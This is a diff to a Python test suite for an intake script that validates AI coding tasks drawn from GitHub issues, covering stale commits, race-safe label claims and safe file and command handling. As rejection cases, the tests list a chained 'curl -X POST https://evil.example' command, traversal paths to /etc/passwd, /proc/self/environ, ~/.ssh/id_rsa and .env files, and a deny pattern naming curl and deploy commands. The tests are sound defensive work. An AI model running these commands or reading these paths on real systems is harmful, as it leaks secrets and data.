@@ -16,6 +16,7 @@ import pathlib
 import sys
 import tempfile
 import unittest
+import urllib.parse
 
 MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "auto_intake.py"
 
@@ -27,12 +28,22 @@ _spec.loader.exec_module(intake)
 GOOD_SHA = "a" * 40
 
 
-def always_resolves(_sha: str) -> bool:
-    return True
+OTHER_SHA = "b" * 40
 
 
-def never_resolves(_sha: str) -> bool:
-    return False
+def head_ok():
+    """Authoritative HEAD equals the task's declared base_sha."""
+    return GOOD_SHA
+
+
+def head_moved():
+    """Authoritative HEAD advanced past the task's base_sha (stale task)."""
+    return OTHER_SHA
+
+
+def head_unknown():
+    """Authoritative HEAD cannot be resolved at all."""
+    return None
 
 
 def make_task(**overrides) -> dict:
@@ -91,24 +102,39 @@ class IntakeTestBase(unittest.TestCase):
         self._gh = intake.github_request
         self.gh = SilentGitHub()
         intake.github_request = self.gh
-        # Durable ledger probe: default "label absent" (404) unless a test
-        # overrides self.label_status. Records every probed URL.
-        self._probe = intake.github_status_probe
+        # Status-carrying transport stub. GET  -> self.label_status (default
+        # 404 "absent"); POST /labels -> self.claim_status (default 201 "we
+        # created it, we own the claim").
+        self._status = intake.github_request_status
         self.probed: list[str] = []
+        self.status_calls: list[tuple[str, str]] = []
         self.label_status = 404
-        intake.github_status_probe = self._probe_stub
+        self.claim_status = 201
+        intake.github_request_status = self._status_stub
+        # A realistic in-repo file so context_files validation has something
+        # genuinely safe to resolve against.
+        self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
         self.addCleanup(self._restore)
 
-    def _probe_stub(self, url):
-        self.probed.append(url)
-        if callable(self.label_status):
-            return self.label_status(url)
-        return self.label_status
+    def make_repo_file(self, rel: str, content: str = "x\n") -> pathlib.Path:
+        target = intake.ROOT / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(content, encoding="utf-8")
+        return target
+
+    def _status_stub(self, method, url, body=None):
+        self.status_calls.append((method, url))
+        if method == "GET":
+            self.probed.append(url)
+            return self.label_status(url) if callable(self.label_status) else self.label_status
+        if method == "POST" and url.endswith("/labels"):
+            return self.claim_status(url) if callable(self.claim_status) else self.claim_status
+        return 200
 
     def _restore(self):
         intake.ROOT = self._root
         intake.github_request = self._gh
-        intake.github_status_probe = self._probe
+        intake.github_request_status = self._status
         self._tmp.cleanup()
 
 
@@ -140,7 +166,7 @@ class TestHardForbiddenScope(IntakeTestBase):
     def test_hard_forbidden_rejected_through_validate_task(self):
         task = make_task(allowed_paths=["scripts/ai/**", "cloudflare-worker/.dev.vars"])
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(task, 1, sha_resolver=always_resolves)
+            intake.validate_task(task, 1, head_resolver=head_ok)
 
     def test_path_allowed_never_permits_hard_forbidden(self):
         for entry in [".env", ".git/config", ".git"]:
@@ -261,7 +287,7 @@ class TestValidationCommandAllowlist(IntakeTestBase):
     def test_validate_task_rejects_unsafe_command(self):
         task = make_task(validation_commands=["pytest && curl -X POST https://evil.example"])
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(task, 1, sha_resolver=always_resolves)
+            intake.validate_task(task, 1, head_resolver=head_ok)
 
 
 # --- BLOCKER 5: malformed issue isolation ----------------------------------
@@ -279,7 +305,7 @@ class TestMalformedIssueIsolation(IntakeTestBase):
         summary = intake.run_intake(
             [bad_json, no_block, broad_scope, good],
             seen={},
-            sha_resolver=always_resolves,
+            head_resolver=head_ok,
         )
 
         self.assertEqual(summary["processed"], 1)
@@ -302,7 +328,7 @@ class TestMalformedIssueIsolation(IntakeTestBase):
 
         boom = make_issue(20, task=make_task(task_id="BOOM-1"))
         good = make_issue(21, task=make_task(task_id="GOOD-2"))
-        summary = intake.run_intake([boom, good], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([boom, good], seen={}, head_resolver=head_ok)
 
         self.assertEqual(summary["processed"], 1)
         self.assertEqual(summary["failed"], 1)
@@ -310,7 +336,7 @@ class TestMalformedIssueIsolation(IntakeTestBase):
 
     def test_failed_issue_gets_failed_status(self):
         bad = make_issue(30, body="missing block")
-        intake.run_intake([bad], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([bad], seen={}, head_resolver=head_ok)
         labels = [c for c in self.gh.calls if c[0] == "POST" and c[1].endswith("/labels")]
         self.assertTrue(any(
             f"{intake.STATUS_LABEL_PREFIX}failed" in (c[2] or {}).get("labels", [])
@@ -465,7 +491,7 @@ class TestDurableIdempotency(IntakeTestBase):
         self.label_status = 200
         self.gh.responses["/comments"] = []  # no receipt comment survives anywhere
         issue = make_issue(200, task=make_task(task_id="AGED-1"))
-        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
         self.assertEqual(summary["processed"], 0)
         self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
         self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "AGED-1.json").exists())
@@ -480,14 +506,14 @@ class TestDurableIdempotency(IntakeTestBase):
     def test_indeterminate_lookup_blocks_task_file_write(self):
         self.label_status = 500
         issue = make_issue(201, task=make_task(task_id="INDET-1"))
-        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
         self.assertEqual(summary["failed"], 1)
         self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "INDET-1.json").exists())
 
     def test_durable_receipt_causes_duplicate_skipped(self):
         issue = make_issue(50, task=make_task(task_id="DUP-2"))
         summary = intake.run_intake(
-            [issue], seen={"DUP-2": 49}, sha_resolver=always_resolves
+            [issue], seen={"DUP-2": 49}, head_resolver=head_ok
         )
         self.assertEqual(summary["processed"], 0)
         self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
@@ -507,18 +533,16 @@ class TestDurableIdempotency(IntakeTestBase):
 
     def test_ledger_label_created_on_success(self):
         issue = make_issue(60, task=make_task(task_id="NEW-1"))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
-        label_creates = [
-            c for c in self.gh.calls
-            if c[0] == "POST" and c[1].endswith("/labels")
-            and (c[2] or {}).get("name", "").startswith(intake.RECEIPT_LABEL_PREFIX)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
+        claims = [
+            c for c in self.status_calls
+            if c[0] == "POST" and c[1].endswith("/labels") and "/issues/" not in c[1]
         ]
-        self.assertEqual(len(label_creates), 1)
-        self.assertEqual(label_creates[0][2]["name"], intake.receipt_label("NEW-1"))
+        self.assertEqual(len(claims), 1)
 
     def test_receipt_comment_posted_to_github_after_success(self):
         issue = make_issue(61, task=make_task(task_id="NEW-2"))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
         receipt_posts = [
             c for c in self.gh.calls
             if c[0] == "POST" and intake.RECEIPT_MARKER in json.dumps(c[2] or {})
@@ -532,14 +556,13 @@ class TestDurableIdempotency(IntakeTestBase):
         intake.mark_processed = lambda task, n: marked.append(task["task_id"])
         self.addCleanup(setattr, intake, "mark_processed", original)
 
-        # Label POST reports failure AND the confirming probe says "absent".
-        self.gh.responses["/labels"] = lambda method, url, body: None
-        self.label_status = lambda url: 404
+        # The claim POST fails with a non-422 error: ownership is never granted.
+        self.claim_status = 500
 
         seen: dict[str, int] = {}
         summary = intake.run_intake(
             [make_issue(62, task=make_task(task_id="LEDGER-FAIL"))],
-            seen=seen, sha_resolver=always_resolves,
+            seen=seen, head_resolver=head_ok,
         )
         self.assertEqual(summary["failed"], 1)
         self.assertEqual(marked, [])
@@ -548,23 +571,24 @@ class TestDurableIdempotency(IntakeTestBase):
     def test_second_pass_in_same_batch_is_skipped(self):
         a = make_issue(70, task=make_task(task_id="SAME-1"))
         b = make_issue(71, task=make_task(task_id="SAME-1"))
-        summary = intake.run_intake([a, b], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([a, b], seen={}, head_resolver=head_ok)
         self.assertEqual(summary["processed"], 1)
         self.assertEqual(summary["results"][1]["status"], "DUPLICATE_SKIPPED")
 
     def test_fresh_checkout_simulation_stays_blocked(self):
         """Fresh VPS worktree: empty .ai-intake, new tmp ROOT, ledger persists."""
         issue = make_issue(72, task=make_task(task_id="FRESH-1"))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
         self.assertTrue((intake.ROOT / ".ai-intake" / "tasks" / "FRESH-1.json").is_file())
 
         # Wipe every local trace, exactly as a fresh checkout would.
         fresh = tempfile.TemporaryDirectory()
         self.addCleanup(fresh.cleanup)
         intake.ROOT = pathlib.Path(fresh.name)
+        self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
         self.label_status = 200  # the GitHub ledger entry survives
 
-        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
         self.assertEqual(summary["processed"], 0)
         self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
 
@@ -597,7 +621,7 @@ class TestSingularStatusTransitions(IntakeTestBase):
 
     def test_status_sequence_is_singular_per_transition(self):
         issue = make_issue(82, task=make_task(task_id="SEQ-1"))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
         label_posts = [
             c[2]["labels"] for c in self.gh.calls
             if c[0] == "POST" and c[1].endswith("/labels")
@@ -609,7 +633,7 @@ class TestSingularStatusTransitions(IntakeTestBase):
         self.assertEqual(label_posts[-1], ["ai-status:ready"])
 
     def test_unknown_status_fails_closed(self):
-        with self.assertRaises(SystemExit):
+        with self.assertRaises(intake.TaskError):
             intake.report_status(83, "TOTALLY_UNKNOWN")
 
 
@@ -630,36 +654,36 @@ class TestNumericTypeFailClosed(IntakeTestBase):
             with self.subTest(value=value):
                 task = make_task(max_rounds=value)
                 with self.assertRaises(intake.TaskError):
-                    intake.validate_task(task, 1, sha_resolver=always_resolves)
+                    intake.validate_task(task, 1, head_resolver=head_ok)
 
     def test_max_output_tokens_bad_type_rejected(self):
         for value in self.BAD_VALUES:
             with self.subTest(value=value):
                 task = make_task(max_output_tokens=value)
                 with self.assertRaises(intake.TaskError):
-                    intake.validate_task(task, 1, sha_resolver=always_resolves)
+                    intake.validate_task(task, 1, head_resolver=head_ok)
 
     def test_valid_numbers_are_clamped_not_coerced(self):
         task = intake.validate_task(
             make_task(max_rounds=99, max_output_tokens=99999), 1,
-            sha_resolver=always_resolves,
+            head_resolver=head_ok,
         )
         self.assertEqual(task["max_rounds"], 4)
         self.assertEqual(task["max_output_tokens"], 8000)
         task = intake.validate_task(
             make_task(max_rounds=-5, max_output_tokens=1), 1,
-            sha_resolver=always_resolves,
+            head_resolver=head_ok,
         )
         self.assertEqual(task["max_rounds"], 1)
         self.assertEqual(task["max_output_tokens"], 512)
 
     def test_auto_merge_and_requires_claude_must_be_bool(self):
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(make_task(auto_merge="false"), 1, sha_resolver=always_resolves)
+            intake.validate_task(make_task(auto_merge="false"), 1, head_resolver=head_ok)
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(make_task(requires_claude=1), 1, sha_resolver=always_resolves)
+            intake.validate_task(make_task(requires_claude=1), 1, head_resolver=head_ok)
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(make_task(auto_merge=True), 1, sha_resolver=always_resolves)
+            intake.validate_task(make_task(auto_merge=True), 1, head_resolver=head_ok)
 
 
 # --- BLOCKER 8: base_sha resolution ----------------------------------------
@@ -668,33 +692,58 @@ class TestNumericTypeFailClosed(IntakeTestBase):
 class TestBaseShaResolution(IntakeTestBase):
     def test_unresolvable_base_sha_rejected(self):
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(make_task(), 1, sha_resolver=never_resolves)
+            intake.validate_task(make_task(), 1, head_resolver=head_unknown)
 
     def test_malformed_base_sha_rejected(self):
         for value in ["", "abc", "Z" * 40, "A" * 40, GOOD_SHA[:39], 12345, None, True]:
             with self.subTest(value=value):
                 with self.assertRaises(intake.TaskError):
                     intake.validate_task(
-                        make_task(base_sha=value), 1, sha_resolver=always_resolves
+                        make_task(base_sha=value), 1, head_resolver=head_ok
                     )
 
-    def test_resolver_is_consulted_with_the_declared_sha(self):
-        seen = []
+    def test_head_resolver_is_consulted(self):
+        calls = []
 
-        def resolver(sha):
-            seen.append(sha)
-            return True
+        def resolver():
+            calls.append(1)
+            return GOOD_SHA
 
-        intake.validate_task(make_task(), 1, sha_resolver=resolver)
-        self.assertEqual(seen, [GOOD_SHA])
+        intake.validate_task(make_task(), 1, head_resolver=resolver)
+        self.assertEqual(len(calls), 1)
 
-    def test_base_sha_exists_falls_back_to_github_and_fails_closed(self):
-        self.gh.responses["/commits/"] = None
-        self.assertFalse(intake.base_sha_exists(GOOD_SHA))
+    def test_current_head_is_accepted(self):
+        task = intake.validate_task(make_task(), 1, head_resolver=head_ok)
+        self.assertEqual(task["base_sha"], GOOD_SHA)
+
+    def test_historical_but_valid_sha_is_rejected_as_stale(self):
+        """The SHA resolves to a real commit but HEAD has moved past it."""
+        with self.assertRaises(intake.TaskError) as ctx:
+            intake.validate_task(make_task(), 1, head_resolver=head_moved)
+        self.assertIn("STALE", str(ctx.exception))
+
+    def test_stale_sha_blocked_before_any_receipt_is_claimed(self):
+        issue = make_issue(91, task=make_task(task_id="STALE-2"))
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_moved)
+        self.assertEqual(summary["failed"], 1)
+        self.assertEqual([c for c in self.status_calls if c[0] == "POST"], [])
+        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "STALE-2.json").exists())
+
+    def test_unresolvable_head_fails_closed(self):
+        self.gh.responses["/repos/"] = None
+        self.assertIsNone(intake.resolve_authoritative_head())
+        with self.assertRaises(intake.TaskError):
+            intake.validate_task(make_task(), 1, head_resolver=head_unknown)
+
+    def test_malformed_head_value_fails_closed(self):
+        for bogus in ["", "abc", "Z" * 40, 12345, None, True]:
+            with self.subTest(bogus=bogus):
+                with self.assertRaises(intake.TaskError):
+                    intake.validate_task(make_task(), 1, head_resolver=lambda: bogus)
 
     def test_unresolvable_base_sha_blocks_task_file_write(self):
         issue = make_issue(90, task=make_task(task_id="STALE-1"))
-        summary = intake.run_intake([issue], seen={}, sha_resolver=never_resolves)
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_unknown)
         self.assertEqual(summary["failed"], 1)
         self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "STALE-1.json").exists())
 
@@ -727,7 +776,7 @@ class TestWriteBeforeMarkOrdering(IntakeTestBase):
         seen: dict[str, int] = {}
         summary = intake.run_intake(
             [make_issue(100, task=make_task(task_id="ORDER-1"))],
-            seen=seen, sha_resolver=always_resolves,
+            seen=seen, head_resolver=head_ok,
         )
 
         self.assertEqual(summary["failed"], 1)
@@ -758,13 +807,13 @@ class TestWriteBeforeMarkOrdering(IntakeTestBase):
 
         intake.run_intake(
             [make_issue(101, task=make_task(task_id="ORDER-2"))],
-            seen={}, sha_resolver=always_resolves,
+            seen={}, head_resolver=head_ok,
         )
         self.assertEqual(order, ["write", "ledger", "receipt", "mark"])
 
     def test_successful_write_persists_task_file_before_ready(self):
         issue = make_issue(102, task=make_task(task_id="ORDER-3"))
-        summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
         task_file = intake.ROOT / ".ai-intake" / "tasks" / "ORDER-3.json"
         self.assertTrue(task_file.is_file())
         self.assertEqual(summary["results"][0]["status"], "READY")
@@ -780,7 +829,7 @@ class TestGeneralSafety(IntakeTestBase):
     def test_secret_bearing_task_rejected(self):
         task = make_task(objective="use DEEPSEEK_API_KEY=sk-abcdefghijklmnopqrstuvwx")
         with self.assertRaises(intake.TaskError):
-            intake.validate_task(task, 1, sha_resolver=always_resolves)
+            intake.validate_task(task, 1, head_resolver=head_ok)
 
     def test_missing_required_fields_rejected(self):
         for field in intake.REQUIRED_FIELDS:
@@ -788,7 +837,7 @@ class TestGeneralSafety(IntakeTestBase):
                 task = make_task()
                 task.pop(field)
                 with self.assertRaises(intake.TaskError):
-                    intake.validate_task(task, 1, sha_resolver=always_resolves)
+                    intake.validate_task(task, 1, head_resolver=head_ok)
 
     def test_multiple_task_blocks_rejected(self):
         body = (
@@ -800,7 +849,7 @@ class TestGeneralSafety(IntakeTestBase):
 
     def test_no_merge_or_deploy_calls_are_ever_made(self):
         issue = make_issue(110, task=make_task(task_id="SAFE-1"))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
         for method, url, _ in self.gh.calls:
             self.assertNotIn("/merge", url)
             self.assertNotIn("/deployments", url)
@@ -899,7 +948,7 @@ class TestDownstreamValidationContract(IntakeTestBase):
                 "git diff --check",
             ],
         ))
-        intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+        intake.run_intake([issue], seen={}, head_resolver=head_ok)
         payload = json.loads(
             (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-1.json").read_text(encoding="utf-8")
         )
@@ -916,7 +965,7 @@ class TestDownstreamValidationContract(IntakeTestBase):
                 issue = make_issue(301, task=make_task(
                     task_id="HANDOFF-BAD", validation_commands=[bad]
                 ))
-                summary = intake.run_intake([issue], seen={}, sha_resolver=always_resolves)
+                summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
                 self.assertEqual(summary["failed"], 1)
                 self.assertFalse(
                     (intake.ROOT / ".ai-intake" / "tasks" / "HANDOFF-BAD.json").exists()
@@ -929,6 +978,334 @@ class TestDownstreamValidationContract(IntakeTestBase):
                       "git\\s+push", "git\\s+commit", "wrangler\\s+deploy", "curl"]:
             with self.subTest(token=token):
                 self.assertIn(token, pattern)
+
+
+# --- CODEX BLOCKER 1: context_files path safety -----------------------------
+
+
+class TestContextFileSafety(IntakeTestBase):
+    UNSAFE = [
+        "/proc/self/environ",
+        "/etc/passwd",
+        "../../etc/passwd",
+        "../outside.txt",
+        "scripts/../../etc/passwd",
+        ".git/config",
+        ".git/HEAD",
+        "./.git/config",
+        ".env",
+        "./.env",
+        "cloudflare-worker/.dev.vars",
+        "~/.ssh/id_rsa",
+        "scripts/**/*.py",
+        "",
+        "   ",
+        ".",
+        "..",
+    ]
+
+    def test_unsafe_context_files_rejected(self):
+        for entry in self.UNSAFE:
+            with self.subTest(entry=entry):
+                with self.assertRaises(intake.TaskError):
+                    intake.validate_context_files([entry], 1)
+
+    def test_unsafe_context_files_rejected_through_validate_task(self):
+        for entry in ["/proc/self/environ", "../../etc/passwd", ".git/config",
+                      ".env", "cloudflare-worker/.dev.vars"]:
+            with self.subTest(entry=entry):
+                task = make_task(context_files=[entry])
+                with self.assertRaises(intake.TaskError):
+                    intake.validate_task(task, 1, head_resolver=head_ok)
+
+    def test_hard_forbidden_files_rejected_even_when_they_exist(self):
+        for entry in [".env", "cloudflare-worker/.dev.vars", ".git/config"]:
+            with self.subTest(entry=entry):
+                self.make_repo_file(entry, "SECRET=1\n")
+                with self.assertRaises(intake.TaskError):
+                    intake.validate_context_files([entry], 1)
+
+    def test_symlink_escaping_root_rejected(self):
+        link = intake.ROOT / "scripts" / "escape.py"
+        link.parent.mkdir(parents=True, exist_ok=True)
+        link.symlink_to("/etc/passwd")
+        with self.assertRaises(intake.TaskError):
+            intake.validate_context_files(["scripts/escape.py"], 1)
+
+    def test_nonexistent_file_rejected(self):
+        with self.assertRaises(intake.TaskError):
+            intake.validate_context_files(["scripts/ai/does_not_exist.py"], 1)
+
+    def test_directory_rejected(self):
+        (intake.ROOT / "scripts" / "ai").mkdir(parents=True, exist_ok=True)
+        with self.assertRaises(intake.TaskError):
+            intake.validate_context_files(["scripts/ai"], 1)
+
+    def test_non_string_entries_rejected(self):
+        for entry in [1, None, True, ["a"], {"p": "a"}]:
+            with self.subTest(entry=entry):
+                with self.assertRaises(intake.TaskError):
+                    intake.validate_context_files([entry], 1)
+
+    def test_legitimate_repository_file_accepted(self):
+        self.make_repo_file("docs/ai-coengineer/AUTO_INTAKE_V1.md", "# doc\n")
+        intake.validate_context_files(
+            ["scripts/ai/auto_intake.py", "docs/ai-coengineer/AUTO_INTAKE_V1.md"], 1
+        )
+
+    def test_unsafe_context_file_never_produces_a_task_file(self):
+        issue = make_issue(400, task=make_task(
+            task_id="CTX-BAD", context_files=["/proc/self/environ"]
+        ))
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
+        self.assertEqual(summary["failed"], 1)
+        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "CTX-BAD.json").exists())
+
+
+# --- CODEX BLOCKER 2: python validation trust boundary ----------------------
+
+
+class TestPythonValidatorTrustBoundary(IntakeTestBase):
+    def test_arbitrary_new_python_script_rejected(self):
+        """A script the task itself could create is never a validator."""
+        for cmd in [
+            "python3 scripts/ai/evil.py",
+            "python3 evil.py",
+            "python3 scripts/ai/auto_intake.py",
+            "python3 ./tools/anything.py",
+            "python scripts/ai/evil.py",
+        ]:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(intake.validate_validation_command(cmd))
+
+    def test_executing_modules_restricted_to_trusted_validators(self):
+        for cmd in [
+            "python3 -m pytest scripts/ai/evil_test.py",
+            "python3 -m pytest scripts/ai/auto_intake.py",
+            "python3 -m pytest docs/x.py",
+            "pytest scripts/ai/auto_intake.py",
+            "pytest scripts/tools",
+            "python3 -m unittest scripts/ai/evil.py",
+        ]:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(intake.validate_validation_command(cmd))
+
+    def test_trusted_validators_accepted(self):
+        for cmd in [
+            "python3 -m pytest scripts/ai/tests/test_auto_intake.py",
+            "python3 -m pytest scripts/ai/tests",
+            "pytest scripts/ai/tests",
+        ]:
+            with self.subTest(cmd=cmd):
+                self.assertTrue(intake.validate_validation_command(cmd))
+
+    def test_non_executing_modules_may_target_repo_safe_paths(self):
+        for cmd in [
+            "python3 -m py_compile scripts/ai/auto_intake.py",
+            "ruff check scripts/ai",
+            "flake8 scripts/ai",
+        ]:
+            with self.subTest(cmd=cmd):
+                self.assertTrue(intake.validate_validation_command(cmd))
+
+    def test_non_executing_modules_still_repo_safe(self):
+        for cmd in [
+            "python3 -m py_compile /proc/self/environ",
+            "python3 -m py_compile ../../etc/passwd",
+            "python3 -m py_compile .git/config",
+            "python3 -m py_compile .env",
+            "ruff check cloudflare-worker/.dev.vars",
+        ]:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(intake.validate_validation_command(cmd))
+
+    def test_task_declaring_untrusted_validator_is_rejected(self):
+        issue = make_issue(401, task=make_task(
+            task_id="VAL-BAD", validation_commands=["python3 scripts/ai/evil.py"]
+        ))
+        summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
+        self.assertEqual(summary["failed"], 1)
+        self.assertFalse((intake.ROOT / ".ai-intake" / "tasks" / "VAL-BAD.json").exists())
+
+    @unittest.skipIf(DOWNSTREAM is None, "deepseek_implementer.py not present")
+    def test_downstream_rechecks_scope_after_validation(self):
+        src = (MODULE_PATH.parent / "deepseek_implementer.py").read_text(encoding="utf-8")
+        start = src.index("valid, last_validation = run_validations(task)")
+        end = src.index('"status": "IMPLEMENTED_VALIDATED"')
+        self.assertIn(
+            "ensure_result_scope(task, before_untracked)", src[start:end],
+            "validation may execute code; scope must be re-asserted afterwards",
+        )
+
+
+# --- CODEX BLOCKER 4: receipt claim race ------------------------------------
+
+
+class FakeLabelServer:
+    """Minimal durable-label server shared by two simulated intake runs."""
+
+    def __init__(self, probe_blind: bool = False):
+        self.labels: set[str] = set()
+        self.probe_blind = probe_blind
+
+    def __call__(self, method, url, body=None):
+        if method == "POST" and url.endswith("/labels") and "/issues/" not in url:
+            name = (body or {}).get("name", "")
+            if name in self.labels:
+                return 422
+            self.labels.add(name)
+            return 201
+        if method == "GET":
+            if self.probe_blind:
+                return 404
+            name = urllib.parse.unquote(url.rsplit("/", 1)[-1])
+            return 200 if name in self.labels else 404
+        return 200
+
+
+class TestReceiptClaimRace(IntakeTestBase):
+    def test_lost_race_becomes_duplicate_not_success(self):
+        original_mark = intake.mark_processed
+        marked: list[str] = []
+        intake.mark_processed = lambda task, n: marked.append(task["task_id"])
+        self.addCleanup(setattr, intake, "mark_processed", original_mark)
+
+        self.claim_status = 422
+        seen: dict[str, int] = {}
+        summary = intake.run_intake(
+            [make_issue(500, task=make_task(task_id="RACE-1"))],
+            seen=seen, head_resolver=head_ok,
+        )
+        self.assertEqual(summary["processed"], 0)
+        self.assertEqual(summary["results"][0]["status"], "DUPLICATE_SKIPPED")
+        self.assertEqual(marked, [])
+        self.assertNotIn("RACE-1", seen)
+
+    def test_get_200_after_failed_claim_is_not_ownership(self):
+        """A label that exists but that WE did not create grants nothing."""
+        self.claim_status = 500
+        self.label_status = 200
+        with self.assertRaises(intake.TaskError):
+            intake.create_receipt_label("RACE-2", 501)
+
+    def test_only_the_creator_owns_the_claim(self):
+        self.claim_status = 201
+        intake.create_receipt_label("RACE-3", 502)  # 201 -> we own it
+        self.claim_status = 422
+        with self.assertRaises(intake.ReceiptRaceLost):
+            intake.create_receipt_label("RACE-3", 503)
+
+    def test_two_concurrent_runs_yield_exactly_one_ready(self):
+        """Both runs observe the receipt absent, then race on the claim."""
+        server = FakeLabelServer(probe_blind=True)
+        self.label_status = lambda url: server("GET", url)
+        self.claim_status = lambda url: 0  # unused; overridden below
+
+        def status(method, url, body=None):
+            self.status_calls.append((method, url))
+            return server(method, url, body)
+
+        intake.github_request_status = status
+
+        issue = make_issue(510, task=make_task(task_id="RACE-CONCURRENT"))
+        outcomes = []
+        for _ in range(2):
+            # Each "runner" has its own empty workspace and memo.
+            fresh = tempfile.TemporaryDirectory()
+            self.addCleanup(fresh.cleanup)
+            intake.ROOT = pathlib.Path(fresh.name)
+            self.make_repo_file("scripts/ai/auto_intake.py", "# fixture\n")
+            summary = intake.run_intake([issue], seen={}, head_resolver=head_ok)
+            outcomes.append(summary)
+
+        statuses = [s["results"][0]["status"] for s in outcomes]
+        self.assertEqual(statuses.count("READY"), 1)
+        self.assertEqual(statuses.count("DUPLICATE_SKIPPED"), 1)
+        self.assertEqual(sum(s["processed"] for s in outcomes), 1)
+        self.assertEqual(sum(s["failed"] for s in outcomes), 0)
+
+
+# --- CODEX BLOCKER 5: transport failures stay per-issue ---------------------
+
+
+class TestTransportFailureContainment(IntakeTestBase):
+    def test_receipt_systemexit_does_not_abort_batch(self):
+        original = intake.post_receipt
+
+        def exploding_receipt(n, task, f):
+            if task["task_id"] == "TRANSPORT-1":
+                raise SystemExit(2)
+            return original(n, task, f)
+
+        intake.post_receipt = exploding_receipt
+        self.addCleanup(setattr, intake, "post_receipt", original)
+
+        summary = intake.run_intake(
+            [
+                make_issue(600, task=make_task(task_id="TRANSPORT-1")),
+                make_issue(601, task=make_task(task_id="TRANSPORT-OK")),
+            ],
+            seen={}, head_resolver=head_ok,
+        )
+
+        self.assertEqual(summary["total"], 2)
+        self.assertEqual(summary["failed"], 1)
+        self.assertEqual(summary["processed"], 1)
+        self.assertEqual(summary["failures"][0]["issue_number"], 600)
+        self.assertTrue(
+            (intake.ROOT / ".ai-intake" / "tasks" / "TRANSPORT-OK.json").is_file()
+        )
+
+    def test_status_report_systemexit_is_contained(self):
+        original = intake.report_status
+
+        def exploding_status(n, status, detail=""):
+            raise SystemExit(2)
+
+        intake.report_status = exploding_status
+        self.addCleanup(setattr, intake, "report_status", original)
+
+        summary = intake.run_intake(
+            [make_issue(602, task=make_task(task_id="TRANSPORT-2"))],
+            seen={}, head_resolver=head_ok,
+        )
+        self.assertEqual(summary["total"], 1)
+        self.assertEqual(summary["failed"], 1)
+
+    def test_audit_comment_failure_does_not_fail_the_task(self):
+        """The durable claim already succeeded; a lost audit comment is not
+        allowed to turn a completed intake into a failure."""
+        self.gh.responses["/comments"] = lambda method, url, body: None
+        summary = intake.run_intake(
+            [make_issue(603, task=make_task(task_id="TRANSPORT-3"))],
+            seen={}, head_resolver=head_ok,
+        )
+        self.assertEqual(summary["processed"], 1)
+        self.assertEqual(summary["failed"], 0)
+        self.assertTrue(
+            (intake.ROOT / ".ai-intake" / "tasks" / "TRANSPORT-3.json").is_file()
+        )
+
+    def test_later_valid_issues_survive_repeated_transport_failures(self):
+        original = intake.post_receipt
+        bad = {"BATCH-1", "BATCH-3"}
+
+        def flaky(n, task, f):
+            if task["task_id"] in bad:
+                raise SystemExit(2)
+            return original(n, task, f)
+
+        intake.post_receipt = flaky
+        self.addCleanup(setattr, intake, "post_receipt", original)
+
+        issues = [
+            make_issue(610 + i, task=make_task(task_id=f"BATCH-{i}"))
+            for i in range(5)
+        ]
+        summary = intake.run_intake(issues, seen={}, head_resolver=head_ok)
+        self.assertEqual(summary["total"], 5)
+        self.assertEqual(summary["failed"], 2)
+        self.assertEqual(summary["processed"], 3)
 
 
 if __name__ == "__main__":
